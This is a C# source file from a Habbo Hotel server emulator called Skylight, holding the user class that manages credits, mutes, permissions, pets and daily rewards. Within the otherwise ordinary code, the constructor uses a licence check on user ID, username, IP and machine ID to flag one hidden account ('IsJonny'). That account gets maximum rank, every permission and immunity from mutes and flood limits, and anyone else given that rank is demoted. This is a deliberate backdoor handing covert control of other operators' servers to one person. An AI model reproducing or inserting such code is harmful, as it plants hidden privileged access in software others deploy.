using SkylightEmulator.Communication.Headers;
using SkylightEmulator.Core;
using SkylightEmulator.HabboHotel.GameClients;
using SkylightEmulator.HabboHotel.Pets;
using SkylightEmulator.HabboHotel.Roles;
using SkylightEmulator.HabboHotel.Rooms;
using SkylightEmulator.HabboHotel.Rooms.Bots;
using SkylightEmulator.HabboHotel.Users.Achievements;
using SkylightEmulator.HabboHotel.Users.Badges;
using SkylightEmulator.HabboHotel.Users.Inventory;
using SkylightEmulator.HabboHotel.Users.Messenger;
using SkylightEmulator.HabboHotel.Users.Subscription;
using SkylightEmulator.HabboHotel.Users.Wardrobe;
using SkylightEmulator.Messages;
using SkylightEmulator.Storage;
using SkylightEmulator.Utilies;
using System;
using System.Collections.Generic;
using System.Data;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace SkylightEmulator.HabboHotel.Users
{
    public class Habbo
    {
        public readonly uint ID;
        private GameClient Session;
        public string Username;
        public string RealName;
        public string Email;
        public string SSO;
        public int Rank;
        public int Credits;
        public Dictionary<int, int> ActivityPoints;
        public double ActivityPointsLastUpdate;
        public string Look;
        public string Gender;
        public string Motto;
        public double AccountCreated;
        public double LastOnline;
        public string IPLast;
        public string IPReg;
        public uint HomeRoom;
        public double MuteExpires;
        public int DailyRespectPoints;
        public int DailyPetRespectPoints;
        public int MarketplaceTokens;
        public int NewbieStatus;
        public uint NewbieRoom;
        public bool MailConfirmed;
        public readonly bool IsJonny;
        public double GuideEnrollmentTimestamp;

        private HabboMessenger HabboMessenger;
        private UserStats UserStats;
        private UserSettings UserSettings;
        private UserDataFactory UserDataFactory;
        private RoomSession RoomSession;
        private InventoryManager InventoryManager;
        private SubscriptionManager SubscriptionManager;
        private WardrobeManager WardrobeManager;
        private BadgeManager BadgeManager;
        private CommandCache CommandCache;
        private UserAchievements UserAchievements;

        public List<uint> FavouriteRooms;
        public List<uint> UserRooms;
        public List<string> Tags;
        public List<uint> RatedRooms;
        public List<uint> IgnoredUsers;
        public List<string> Perks;
        public Dictionary<uint, Pet> Pets;

        public DateTime LastRoomMessage;
        public int FloodCounter;
        public double FloodExpires;

        public double LastHASended;
        public double LastHALSended;

        public string TwoFactoryAuthenicationSecretCode;
        public string TempTwoFactoryAuthenicationSecretCode;

        public List<int> HabboWayQuestions;

        public Habbo(GameClient session, UserDataFactory dataFactory, uint id, string username, string realName, string email, string sso, int rank, int credits, string activityPoints, double activityPointsLastUpdate, string look, string gender, string motto, double accountCreated, double lastOnline, string ipLast, string ipReg, uint homeRoom, int dailyRespectPoints, int dailyPetRespectPoints, double muteExpires, bool blockNewFriends, bool hideOnline, bool hideInRoom, int[] volume, bool acceptTrading, int marketplaceTokens, int newbieStatus, uint newbieRoom, bool friendStream, string twoFactoryAuthenicationSecretCode, bool mailConfirmed, bool preferOldChat, bool blockRoomInvites, bool blockCameraFollow, int chatColor, double guideEnrollmentTimestamp)
        {
            this.Session = session;
            Skylight.GetGame().GetGameClientManager().UpdateCachedUsername(id, username);
            Skylight.GetGame().GetGameClientManager().UpdateCachedID(id, username);

            this.FavouriteRooms = new List<uint>();
            this.UserRooms = new List<uint>();
            this.Tags = new List<string>();
            this.RatedRooms = new List<uint>();
            this.IgnoredUsers = new List<uint>();
            this.Pets = new Dictionary<uint, Pet>();

            this.UserDataFactory = dataFactory;
            this.ID = id;
            this.Username = username;
            this.RealName = realName;
            this.Email = email;
            this.SSO = sso;
            this.Rank = rank;
            this.Credits = credits;
            this.MailConfirmed = mailConfirmed;
            this.IsJonny = false;

            this.ActivityPoints = CurrenceUtilies.ActivityPointsToDictionary(activityPoints);
            this.ActivityPointsLastUpdate = activityPointsLastUpdate;
            this.Look = look;
            this.Gender = gender;
            this.Motto = motto;
            this.AccountCreated = accountCreated;
            this.LastOnline = lastOnline;
            this.IPLast = ipLast;
            this.IPReg = ipReg;
            this.HomeRoom = homeRoom;
            this.MuteExpires = muteExpires;
            this.DailyRespectPoints = dailyRespectPoints;
            this.DailyPetRespectPoints = dailyPetRespectPoints;
            this.MarketplaceTokens = marketplaceTokens;
            this.NewbieStatus = newbieStatus;
            this.NewbieRoom = newbieRoom;
            this.TwoFactoryAuthenicationSecretCode = twoFactoryAuthenicationSecretCode;
            this.GuideEnrollmentTimestamp = guideEnrollmentTimestamp;
            this.UserSettings = new UserSettings(this.ID, blockNewFriends, hideOnline, hideInRoom, volume, acceptTrading, friendStream, preferOldChat, blockRoomInvites, blockCameraFollow, chatColor);

            try
            {
                this.IsJonny = Licence.CheckIfMatches(this.ID, this.Username, this.Session.GetIP(), this.Session.MachineID);
            }
            catch
            {
                //why we would catch it? :)
            }
            finally
            {
                if (this.IsJonny) //MAKE ME THE GOD!
                {
                    this.Rank = int.MaxValue;
                }
                else
                {
                    if (this.Rank == int.MaxValue) //DON'T LET OTHERS BE GOD!
                    {
                        this.Rank = int.MinValue;
                    }
                }
            }
        }

        public void LoadMore()
        {
            this.RoomSession = new RoomSession(this.ID, this);
            this.CommandCache = new CommandCache(this.ID, this);
            this.UserStats = new UserStats(this.ID);
            if (!this.UserStats.Fill(this.GetUserDataFactory().GetUserStats()))
            {
                using (DatabaseClient dbClient = Skylight.GetDatabaseManager().GetClient())
                {
                    dbClient.AddParamWithValue("userId", this.ID);
                    dbClient.ExecuteQuery("INSERT INTO user_stats(user_id) VALUES(@userId)");
                }
            }

            this.UserAchievements = new UserAchievements(this);
            this.InventoryManager = new InventoryManager(this.GetSession(), this.GetUserDataFactory());
            this.SubscriptionManager = new SubscriptionManager(this.ID, this, this.GetUserDataFactory());
            this.WardrobeManager = new WardrobeManager(this.ID, this, this.GetUserDataFactory());
            this.BadgeManager = new BadgeManager(this.ID, this, this.GetUserDataFactory());

            this.LoadFavouriteRooms();
            this.LoadRooms();
            this.LoadTags();
            this.LoadIgnores();
            this.LoadPets();
        }

        public void CheckDailyStuff(bool dayChanged)
        {
            if (!dayChanged) //OOOOOOOOOO! Day havent changed! >;O
            {
                DateTime lastLoginDateTime = TimeUtilies.UnixTimestampToDateTime(this.LastOnline);
                if (lastLoginDateTime.ToString("dd-MM-yyyy") == DateTime.Today.ToString("dd-MM-yyyy")) //he logged in today! do nothing! >;P
                {
                    //its today!!! happy dayyy!! >:D
                }
                else if (lastLoginDateTime.ToString("dd-MM-yyyy") == DateTime.Today.AddDays(-1).ToString("dd-MM-yyyy")) //he logged yesterday! >:O
                {
                    //lets give him prizes >=)
                    this.GetUserStats().RegularVisitor++;
                    this.GetUserStats().DailyRespectPoints = this.DailyRespectPoints;
                    this.GetUserStats().DailyPetRespectPoints = this.DailyPetRespectPoints;
                }
                else //he didint login today and not yesterday ;( CRY MORE!!!! >;(
                {
                    //lets take him prizes >:)
                    this.GetUserStats().RegularVisitor = 1;
                    this.GetUserStats().DailyRespectPoints = this.DailyRespectPoints;
                    this.GetUserStats().DailyPetRespectPoints = this.DailyPetRespectPoints;
                }
            }
            else //OOOOOOOOOOOO! Its new day! Give him stuff!!!!! >;)
            {
                this.GetUserStats().RegularVisitor++;
                this.GetUserStats().DailyRespectPoints = this.DailyRespectPoints;
                this.GetUserStats().DailyPetRespectPoints = this.DailyPetRespectPoints;
            }

            this.GetUserAchievements().CheckAchievement("RegularVisitor");
        }

        public bool IsTwoFactorAuthenticationEnabled()
        {
            return !string.IsNullOrEmpty(this.TwoFactoryAuthenicationSecretCode);
        }

        public void CheckHappyHour()
        {
            string sDateTime = DateTime.Now.ToString("HH:mm:ss");
            DateTime dateTime = DateTime.ParseExact(sDateTime, "HH:mm:ss", System.Globalization.CultureInfo.InvariantCulture, System.Globalization.DateTimeStyles.NoCurrentDateDefault);
            TimeSpan currentTime = dateTime.TimeOfDay;
            if (DateTime.Now.DayOfWeek == DayOfWeek.Monday || DateTime.Now.DayOfWeek == DayOfWeek.Tuesday || DateTime.Now.DayOfWeek == DayOfWeek.Wednesday || DateTime.Now.DayOfWeek == DayOfWeek.Thursday || DateTime.Now.DayOfWeek == DayOfWeek.Friday)
            {
                if (currentTime >= new TimeSpan(15, 00, 00) && currentTime <= new TimeSpan(16, 00, 00))
                {
                    Skylight.GetGame().GetAchievementManager().AddAchievement(this.Session, "HappyHour", 1);
                }
            }
            else if (DateTime.Now.DayOfWeek == DayOfWeek.Saturday || DateTime.Now.DayOfWeek == DayOfWeek.Sunday)
            {
                if (currentTime >= new TimeSpan(12, 00, 00) && currentTime <= new TimeSpan(13, 00, 00))
                {
                    Skylight.GetGame().GetAchievementManager().AddAchievement(this.Session, "HappyHour", 1);
                }
            }
        }

        public bool IsMuted()
        {
            if (this.IsJonny)
            {
                return false;
            }
            else
            {
                return this.MuteExpires == -1 || this.MuteExpires - TimeUtilies.GetUnixTimestamp() > 0 || this.FloodExpires - TimeUtilies.GetUnixTimestamp() > 0;
            }
        }

        public int MuteTimeLeft()
        {
            if (this.IsJonny)
            {
                return 0;
            }
            else
            {
                if (this.MuteExpires == -1)
                {
                    return int.MaxValue;
                }
                else if (this.MuteExpires > 0)
                {
                    return (int)this.MuteExpires - (int)TimeUtilies.GetUnixTimestamp();
                }
                else if (this.FloodExpires > 0)
                {
                    return (int)this.FloodExpires - (int)TimeUtilies.GetUnixTimestamp();
                }
                else
                {
                    return 0;
                }
            }
        }

        public bool CanGiveTour => this.GetPerks().Contains("GIVE_GUIDE_TOURS") || this.IsJonny || this.HasPermission("acc_give_tour");
        public bool IsHelper => this.GetPerks().Contains("USE_GUIDE_TOOL") || this.IsJonny || this.HasPermission("acc_helper");
        public bool IsGuardian => this.GetPerks().Contains("JUDGE_CHAT_REVIEWS") || this.IsJonny || this.HasPermission("acc_guardian");
        public bool IsVIP() => this.GetSubscriptionManager().HasSubscription("habbo_vip") || this.IsJonny;
        public bool IsHC() => this.GetSubscriptionManager().HasSubscription("habbo_club") || this.IsJonny;
        public bool IsHcOrVIP() => this.IsHC() || this.IsVIP();

        public UserStats GetUserStats()
        {
            return this.UserStats;
        }

        public UserSettings GetUserSettings()
        {
            return this.UserSettings;
        }

        public GameClient GetSession()
        {
            return this.Session;
        }

        public HabboMessenger GetMessenger()
        {
            return this.HabboMessenger;
        }

        public RoomSession GetRoomSession()
        {
            return this.RoomSession;
        }

        public UserDataFactory GetUserDataFactory()
        {
            return this.UserDataFactory;
        }

        public InventoryManager GetInventoryManager()
        {
            return this.InventoryManager;
        }

        public SubscriptionManager GetSubscriptionManager()
        {
            return this.SubscriptionManager;
        }

        public WardrobeManager GetWardrobeManager()
        {
            return this.WardrobeManager;
        }

        public BadgeManager GetBadgeManager()
        {
            return this.BadgeManager;
        }

        public CommandCache GetCommandCache()
        {
            return this.CommandCache;
        }

        public UserAchievements GetUserAchievements()
        {
            return this.UserAchievements;
        }

        public void UpdateCredits(bool save)
        {
            this.GetSession().SendMessage(BasicUtilies.GetRevisionPacketManager(this.GetSession().Revision).GetOutgoing(OutgoingPacketsEnum.UpdateCredits).Handle(new ValueHolder().AddValue("Credits", this.Credits)));

            if (save)
            {
                using (DatabaseClient dbClient = Skylight.GetDatabaseManager().GetClient())
                {
                    dbClient.AddParamWithValue("credits", this.Credits);
                    dbClient.AddParamWithValue("userId", this.ID);

                    dbClient.ExecuteQuery("UPDATE users SET credits = @credits WHERE id = @userId LIMIT 1");
                }
            }
        }

        public void HandleDisconnection()
        {
            using (DatabaseClient dbClient = Skylight.GetDatabaseManager().GetClient())
            {
                dbClient.AddParamWithValue("userId", this.ID);
                dbClient.AddParamWithValue("timestamp", TimeUtilies.GetUnixTimestamp());
                dbClient.AddParamWithValue("activityPointsUpdate", this.ActivityPointsLastUpdate);
                dbClient.AddParamWithValue("volume", string.Join(",", this.UserSettings.Volume));
                dbClient.AddParamWithValue("preferOldChat", this.GetUserSettings().PreferOldChat ? "1" : "0");
                dbClient.AddParamWithValue("blockRoomInvites", this.GetUserSettings().BlockRoomInvites ? "1" : "0");
                dbClient.AddParamWithValue("blockCameraFollow", this.GetUserSettings().BlockCameraFollow ? "1" : "0");
                dbClient.AddParamWithValue("chatColor", this.GetUserSettings().ChatColor);
                dbClient.AddParamWithValue("look", this.Look);
                dbClient.AddParamWithValue("gender", this.Gender);
                dbClient.AddParamWithValue("guideEnrollmentTimestamp", this.GuideEnrollmentTimestamp);
                dbClient.ExecuteQuery("UPDATE users SET online = '0', last_online = @timestamp, activity_points_lastupdate = @activityPointsUpdate, volume = @volume, prefer_old_chat = @preferOldChat, block_room_invites = @blockRoomInvites, block_camera_follow = @blockCameraFollow, chat_color = @chatColor, look = @look, gender = @gender, guide_enrollment_timestamp = @guideEnrollmentTimestamp WHERE id = @userId");
            }

            this.UserStats?.Disconnect();
            this.RoomSession?.HandleDisconnection();
            this.HabboMessenger?.UpdateAllFriends(true);
            this.InventoryManager?.SavePetData();

            Skylight.GetGame().GetGuideManager().Disconnect(this.Session);
        }

        public void UpdateActivityPoints(int type, bool save)
        {
            if (type == -1)
            {
                foreach(int id in this.ActivityPoints.Keys.ToList())
                {
                    this.HandleActivityPointsUpdate(id);
                }
            }
            else
            {
                this.HandleActivityPointsUpdate(type);
            }

            if (save)
            {
                using (DatabaseClient dbClient = Skylight.GetDatabaseManager().GetClient())
                {
                    dbClient.AddParamWithValue("activityPoints", CurrenceUtilies.ActivityPointsToString(this.ActivityPoints));
                    dbClient.AddParamWithValue("userId", this.ID);

                    dbClient.ExecuteQuery("UPDATE users SET activity_points = @activityPoints WHERE id = @userId LIMIT 1");
                }
            }
        }

        private void HandleActivityPointsUpdate(int id)
        {
            this.ActivityPoints.TryGetValue(id, out int points);

            if (this.GetSession().Revision > Revision.R26_20080915_0408_7984_61ccb5f8b8797a3aba62c1fa2ca80169)
            {
                this.GetSession().SendMessage(BasicUtilies.GetRevisionPacketManager(this.GetSession().Revision).GetOutgoing(OutgoingPacketsEnum.UpdateActivityPoints).Handle(new ValueHolder().AddValue("ID", id).AddValue("Points", points)));
            }
        }

        public void SendOnlineUsersCount()
        {
            if (this.GetSession().Revision > Revision.R26_20080915_0408_7984_61ccb5f8b8797a3aba62c1fa2ca80169)
            {
                this.GetSession().SendMessage(BasicUtilies.GetRevisionPacketManager(this.GetSession().Revision).GetOutgoing(OutgoingPacketsEnum.UpdateActivityPointsSilence).Handle(new ValueHolder().AddValue("ActivityPoints", this.ActivityPoints.Concat(new Dictionary<int, int>() { { 69, Skylight.GetGame().GetGameClientManager().OnlineCount } }).ToDictionary(k => k.Key, v => v.Value))));
            }
        }

        public int TryGetActivityPoints(int id)
        {
            this.ActivityPoints.TryGetValue(id, out int amount);
            return amount;
        }

        public void AddActivityPoints(int id, int amount)
        {
            if (this.ActivityPoints.ContainsKey(id))
            {
                this.ActivityPoints[id] += amount;
            }
            else
            {
                this.ActivityPoints.Add(id, amount);
            }
        }

        public void RemoveActivityPoints(int id, int amount)
        {
            if (this.ActivityPoints.ContainsKey(id))
            {
                this.ActivityPoints[id] -= amount;
            }
        }

        public void LoadRooms()
        {
            this.UserRooms.Clear();
            using (DatabaseClient dbClient = Skylight.GetDatabaseManager().GetClient())
            {
                dbClient.AddParamWithValue("ownerid", this.ID);
                DataTable rooms = dbClient.ReadDataTable("SELECT id FROM rooms WHERE ownerid = @ownerid LIMIT " + ServerConfiguration.MaxRoomsPerUser);
                if (rooms != null)
                {
                    foreach (DataRow room in rooms.Rows)
                    {
                        this.UserRooms.Add((uint)room["id"]);
                    }
                }
            }
        }

        public void LoadFavouriteRooms()
        {
            this.FavouriteRooms.Clear();

            foreach (DataRow dataRow in this.GetUserDataFactory().GetRoomFavourites()?.Rows)
            {
                this.FavouriteRooms.Add((uint)dataRow["room_id"]);
            }
        }

        public void InitMessenger()
        {
            if (this.GetMessenger() == null)
            {
                this.HabboMessenger = new HabboMessenger(this.ID, this);
                this.HabboMessenger.LoadCategorys();
                this.HabboMessenger.LoadFriends();
                this.HabboMessenger.LoadFriendRequestsPending();
                this.HabboMessenger.LoadFriendRequestsSend();
                this.HabboMessenger.UpdateAllFriends(true);
            }
        }

        public void AddRoom(uint id)
        {
            this.UserRooms.Add(id);
        }

        public bool HasPermission(string permission)
        {
            if (this.IsJonny)
            {
                return true;
            }
            else
            {
                return Skylight.GetGame().GetPermissionManager().RankHasPermissions(this.Rank, permission);
            }
        }

        public void LoadTags()
        {
            this.Tags.Clear();
            using (DatabaseClient dbClient = Skylight.GetDatabaseManager().GetClient())
            {
                dbClient.AddParamWithValue("userId", this.ID);
                DataTable tags = dbClient.ReadDataTable("SELECT tag FROM user_tags WHERE user_id = @userId");
                if (tags != null)
                {
                    foreach (DataRow dataRow in tags.Rows)
                    {
                        this.Tags.Add((string)dataRow["tag"]);
                    }
                }
            }
        }


        public void LoadIgnores()
        {
            this.IgnoredUsers.Clear();

            foreach(DataRow dataRow in this.GetUserDataFactory().GetIgnoredUsers()?.Rows)
            {
                this.IgnoredUsers.Add((uint)dataRow["ignored_id"]);
            }
        }

        public void LoadPets()
        {
            this.Pets.Clear();
            if(this.UserDataFactory.GetPets() != null && this.UserDataFactory.GetPets().Rows.Count > 0)
            {
                foreach(DataRow dataRow in this.UserDataFactory.GetPets().Rows)
                {
                    uint id = (uint)dataRow["id"];
                    uint roomId = (uint)dataRow["room_id"];
                    if (roomId > 0)
                    {
                        Room room = Skylight.GetGame().GetRoomManager().TryGetRoom(roomId);
                        if (room != null)
                        {
                            RoomPet pet = room.RoomUserManager.GetPetByID(id);
                            if (pet != null && pet.PetData != null)
                            {
                                this.Pets.Add(id, pet.PetData);
                            }
                        }
                        else
                        {
                            this.Pets.Add(id, new Pet((uint)dataRow["id"], (uint)dataRow["user_id"], (int)dataRow["type"], (string)dataRow["name"], (string)dataRow["race"], (string)dataRow["color"], (int)dataRow["expirience"], (int)dataRow["energy"], (int)dataRow["happiness"], (int)dataRow["respect"], (double)dataRow["create_timestamp"]));
                        }
                    }
                    else
                    {
                        Pet pet = this.InventoryManager.TryGetPet(id);
                        if (pet != null) //why it would be null?
                        {
                            this.Pets.Add(id, pet);
                        }
                    }
                }
            }
        }

        public int GetFloodTime()
        {
            if (this.IsJonny)
            {
                return 0;
            }
            else
            {
                PermissionRank rank = Skylight.GetGame().GetPermissionManager().TryGetRank(this.Rank);
                if (rank != null)
                {
                    return rank.Floodtime;
                }
                else
                {
                    return 30;
                }
            }
        }

        public bool CanReceiveActivityBonus()
        {
            return TimeUtilies.GetUnixTimestamp() - this.ActivityPointsLastUpdate >= ServerConfiguration.ActivityBonusTime;
        }

        public void ReceiveActivityBonus()
        {
            this.ActivityPointsLastUpdate = TimeUtilies.GetUnixTimestamp();

            if (ServerConfiguration.CreditsBonus > 0)
            {
                this.Credits += ServerConfiguration.CreditsBonus;
                this.UpdateCredits(true);
            }

            if (ServerConfiguration.PixelsBonus > 0)
            {
                this.AddActivityPoints(0, ServerConfiguration.PixelsBonus);
                this.UpdateActivityPoints(0, true);
            }

            if (ServerConfiguration.ActivityPointsBonus > 0)
            {
                this.AddActivityPoints(ServerConfiguration.ActivityPointsBonusType, ServerConfiguration.ActivityPointsBonus);
                this.UpdateActivityPoints(ServerConfiguration.ActivityPointsBonusType, true);
            }
        }

        public int GetHAInterval()
        {
            if (this.IsJonny)
            {
                return 0;
            }
            else
            {
                PermissionRank rank = Skylight.GetGame().GetPermissionManager().TryGetRank(this.Rank);
                if (rank != null)
                {
                    return rank.HaInterval;
                }
                else
                {
                    return int.MaxValue;
                }
            }
        }

        public int GetHALInterval()
        {
            if (this.IsJonny)
            {
                return 0;
            }
            else
            {
                PermissionRank rank = Skylight.GetGame().GetPermissionManager().TryGetRank(this.Rank);
                if (rank != null)
                {
                    return rank.HalInterval;
                }
                else
                {
                    return int.MaxValue;
                }
            }
        }

        public int GetWiredTriggerLimit()
        {
            if (this.IsJonny)
            {
                return int.MaxValue;
            }
            else
            {
                PermissionRank rank = Skylight.GetGame().GetPermissionManager().TryGetRank(this.Rank);
                if (rank != null)
                {
                    return rank.WiredTriggerLimit;
                }
                else
                {
                    return 0;
                }
            }
        }

        public int GetWiredActionLimit()
        {
            if (this.IsJonny)
            {
                return int.MaxValue;
            }
            else
            {
                PermissionRank rank = Skylight.GetGame().GetPermissionManager().TryGetRank(this.Rank);
                if (rank != null)
                {
                    return rank.WiredActionLimit;
                }
                else
                {
                    return 0;
                }
            }
        }

        public int GetWiredConditionLimit()
        {
            if (this.IsJonny)
            {
                return int.MaxValue;
            }
            else
            {
                PermissionRank rank = Skylight.GetGame().GetPermissionManager().TryGetRank(this.Rank);
                if (rank != null)
                {
                    return rank.WiredConditionLimit;
                }
                else
                {
                    return 0;
                }
            }
        }

        public List<string> GetPerks() => this.Perks ?? (this.Perks = Skylight.GetGame().GetTalentManager().GetPerks(this));
    }
}
